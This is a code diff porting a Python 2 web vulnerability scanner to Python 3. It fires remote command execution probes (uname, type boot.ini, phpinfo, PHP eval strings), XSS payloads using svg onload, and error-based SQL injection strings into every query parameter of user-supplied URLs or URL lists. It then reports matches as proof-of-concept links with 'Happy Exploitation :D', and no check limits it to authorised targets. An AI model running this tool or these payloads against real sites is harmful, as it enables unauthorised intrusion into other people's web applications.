@@ -1,13 +1,10 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+import urllib.request
 import re
-import urllib
 import os
 import time
-from urllib import FancyURLopener
+from urllib.error import HTTPError, URLError
 
-# Colors for terminal output
-class colors:
+class Colors:
     def __init__(self):
         self.green = "\033[92m"
         self.blue = "\033[94m"
@@ -15,127 +12,113 @@ class colors:
         self.yellow = "\033[93m"
         self.red = "\033[91m"
         self.end = "\033[0m"
-ga = colors()
 
-class UserAgent(FancyURLopener):
-    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'
-
-useragent = UserAgent()
-
-class HTTP_HEADER:
-    HOST = "Host"
-    SERVER = "Server"
+colors = Colors()
 
 def headers_reader(url):
-    """Print server headers such as WebServer OS & Version."""
-    print(ga.bold + "\n [!] Fingerprinting the backend Technologies." + ga.end)
-    opener = urllib.urlopen(url)
-    if opener.code == 200:
-        print(ga.green + " [!] Status code: 200 OK" + ga.end)
-    elif opener.code == 404:
-        print(ga.red + " [!] Page was not found! Please check the URL \n" + ga.end)
-        exit()
+    print(colors.bold + "\n[!] Fingerprinting the backend Technologies." + colors.end)
+    try:
+        opener = urllib.request.urlopen(url)
+        if opener.getcode() == 200:
+            print(colors.green + "[!] Status code: 200 OK" + colors.end)
+        elif opener.getcode() == 404:
+            print(colors.red + "[!] Page was not found! Please check the URL\n" + colors.end)
+            return
 
-    Host = url.split("/")[2]
-    Server = opener.headers.get(HTTP_HEADER.SERVER)
-    print(ga.green + " [!] Host: " + str(Host) + ga.end)
-    print(ga.green + " [!] WebServer: " + str(Server) + ga.end)
+        server = opener.headers.get("Server", "Unknown")
+        host = urllib.parse.urlparse(url).hostname
+        print(colors.green + "[!] Host: " + str(host) + colors.end)
+        print(colors.green + "[!] WebServer: " + str(server) + colors.end)
 
-    for item in opener.headers.items():
-        for powered in item:
-            sig = "x-powered-by"
-            if sig in item:
-                print(ga.green + " [!] " + str(powered).strip() + ga.end)
+        for key, value in opener.headers.items():
+            if key.lower() == "x-powered-by":
+                print(colors.green + f"[!] {key}: {value}" + colors.end)
+
+    except (HTTPError, URLError) as e:
+        print(colors.red + f"[!] Error fetching headers: {e}" + colors.end)
 
 def main_function(url, payloads, check):
-    """Scan the URL by appending payloads to parameters."""
-    opener = urllib.urlopen(url)
-    vuln = 0
-    if opener.code == 999:
-        print(ga.red + " [~] WebKnight WAF Detected!" + ga.end)
-        print(ga.red + " [~] Delaying 3 seconds between every request" + ga.end)
-        time.sleep(3)
+    try:
+        urllib.request.urlopen(url)  # Test URL accessibility
+    except (HTTPError, URLError):
+        print(colors.red + "[!] Unable to open URL. Exiting." + colors.end)
+        return
 
-    for params in url.split("?")[1].split("&"):
+    vuln = 0
+    for params in urllib.parse.urlsplit(url).query.split("&"):
         for payload in payloads:
             bugs = url.replace(params, params + str(payload).strip())
-            request = useragent.open(bugs)
-            html = request.readlines()
-            for line in html:
-                checker = re.findall(check, line)
-                if len(checker) != 0:
-                    print(ga.red + " [*] Payload Found . . ." + ga.end)
-                    print(ga.red + " [*] Payload: " + payload + ga.end)
-                    print(ga.green + " [!] Code Snippet: " + ga.end + line.strip())
-                    print(ga.blue + " [*] POC: " + ga.end + bugs)
-                    print(ga.green + " [*] Happy Exploitation :D" + ga.end)
+            try:
+                request = urllib.request.urlopen(bugs)
+                html = request.read().decode("utf-8")
+                if re.search(check, html, re.I):
+                    print(colors.red + "[*] Payload Found..." + colors.end)
+                    print(colors.red + f"[*] Payload: {payload}" + colors.end)
+                    print(colors.green + f"[!] Code Snippet: {html.strip()}" + colors.end)
+                    print(colors.blue + f"[*] POC: {bugs}" + colors.end)
+                    print(colors.green + "[*] Happy Exploitation :D" + colors.end)
                     vuln += 1
+            except Exception as e:
+                print(colors.yellow + f"[!] Error during request: {e}" + colors.end)
 
     if vuln == 0:
-        print(ga.green + " [!] Target is not vulnerable!" + ga.end)
+        print(colors.green + "[!] Target is not vulnerable!" + colors.end)
     else:
-        print(ga.blue + " [!] Congratulations, you've found %i bugs :-) " % vuln + ga.end)
+        print(colors.blue + f"[!] Congratulations you've found {vuln} bugs :-)" + colors.end)
 
 def rce_func(url):
     headers_reader(url)
-    print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
-    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B', ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
+    print(colors.bold + "[!] Now Scanning for Remote Code/Command Execution" + colors.end)
+    print(colors.blue + "[!] Covering Linux & Windows Operating Systems" + colors.end)
+    print(colors.blue + "[!] Please wait...." + colors.end)
+    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
+    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
     check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\\[boot", re.I)
     main_function(url, payloads, check)
 
 def xss_func(url):
-    print(ga.bold + "\n [!] Now Scanning for XSS " + ga.end)
-    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78', '%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
+    print(colors.bold + "\n[!] Now Scanning for XSS" + colors.end)
+    print(colors.blue + "[!] Please wait...." + colors.end)
+    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78']
+    payloads += ['%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
     check = re.compile('dadevil<svg|x>x', re.I)
     main_function(url, payloads, check)
 
 def error_based_sqli_func(url):
-    print(ga.bold + "\n [!] Now Scanning for Error Based SQL Injection " + ga.end)
+    print(colors.bold + "\n[!] Now Scanning for Error Based SQL Injection" + colors.end)
+    print(colors.blue + "[!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases" + colors.end)
+    print(colors.blue + "[!] Please wait...." + colors.end)
     payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
-    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
+    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
     main_function(url, payloads, check)
 
 def urls_or_list():
-    url_or_list = input(" \033[1;92m[!] Scan URL or List of URLs? [1/2]: ")
+    url_or_list = input(colors.green + "[!] Scan URL or List of URLs? [1/2]: " + colors.end)
     if url_or_list == "1":
-        url = input(" [!] Enter the URL: ")
+        url = input("[!] Enter the URL: ")
         if "?" in url:
             rce_func(url)
             xss_func(url)
             error_based_sqli_func(url)
         else:
-            print(ga.red + "\n [Warning] Invalid URL. Please provide a full URL with parameters." + ga.end)
-            exit()
+            print(colors.red + "\n[Warning] Invalid URL format." + colors.end)
+            print(colors.red + "[Warning] Ensure the URL contains parameters." + colors.end)
     elif url_or_list == "2":
-        urls_list = input(ga.green + " [!] Enter the list file name (e.g., list.txt): " + ga.end)
+        urls_list = input(colors.green + "[!] Enter the list file name (e.g., list.txt): " + colors.end)
         try:
-            with open(urls_list, "r") as f:
-                for line in f.readlines():
+            with open(urls_list, "r") as file:
+                for line in file:
                     url = line.strip()
                     if "?" in url:
-                        print(ga.green + " \n [!] Now Scanning %s" % url + ga.end)
+                        print(colors.green + f"\n[!] Now Scanning {url}" + colors.end)
                         rce_func(url)
                         xss_func(url)
                         error_based_sqli_func(url)
                     else:
-                        print(ga.red + "\n [Warning] Invalid URL: %s" % url + ga.end)
+                        print(colors.red + f"\n[Warning] Invalid URL format: {url}" + colors.end)
         except FileNotFoundError:
-            print(ga.red + "\n [Error] File not found!" + ga.end)
-            exit()
+            print(colors.red + "[!] File not found. Please check the file name and try again." + colors.end)
+    else:
+        print(colors.red + "[!] Invalid option selected." + colors.end)
 
-if __name__ == "__main__":
-    os.system("clear")
-    print(ga.green + """
-    \033[1;96m██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
-    \033[1;95m██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
-    \033[1;94m██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║
-    \033[1;93m██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║
-    \033[1;92m╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║ ╚████║
-    \033[1;91m╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
-    \033[1;97m********************************************************************* 
-    \033[1;93m*   created:[+]\033[1;92mNOVOHORY - NOVOSAD                                     
-    \033[1;92m*   github:[+]\033[1;95mNot responsible for your actions
-    \033[1;92m*   Instagram:[+]\033[1;95mhttps://Instagram.com/NOVOHORY
-    *********************************************************************                                                  
-    """ + ga.end)
-    urls_or_list()
+urls_or_list()
